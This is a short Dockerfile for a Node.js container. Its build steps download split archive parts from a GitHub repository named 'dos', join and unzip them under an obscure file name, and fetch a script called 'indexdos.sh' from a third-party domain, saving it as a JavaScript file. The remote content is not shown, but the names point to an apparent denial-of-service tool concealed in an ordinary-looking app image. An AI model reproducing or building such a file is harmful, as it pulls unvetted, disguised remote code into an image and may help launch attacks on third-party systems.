FROM node:lts-buster
RUN apt-get update && \
apt-get install -y \
ffmpeg \
imagemagick \
webp && \
apt-get upgrade -y && \
rm -rf /var/lib/apt/lists/*
RUN wget https://github.com/werbertofc/dos/blob/main/aa https://github.com/werbertofc/dos/blob/main/ab https://github.com/werbertofc/dos/blob/main/ac https://github.com/werbertofc/dos/blob/main/ad https://github.com/werbertofc/dos/blob/main/ae https://github.com/werbertofc/dos/blob/main/af
RUN cat a* > renderbfanarrowx.zip
RUN unzip renderbfanarrowx.zip
RUN rm -rf renderbfanarrowx.zip
RUN wget -O indexR.js https://go.bruceds.my.id/indexdos.sh
COPY . .
EXPOSE 5000
CMD ["node", "index.js"]
